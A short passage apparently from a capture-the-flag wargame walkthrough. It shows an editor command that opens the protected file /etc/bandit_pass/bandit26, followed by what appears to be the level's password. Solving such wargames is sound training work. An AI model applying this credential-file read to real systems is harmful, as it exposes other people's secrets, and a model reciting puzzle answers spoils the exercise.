: e /etc/bandit_pass/bandit26

5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

```

 



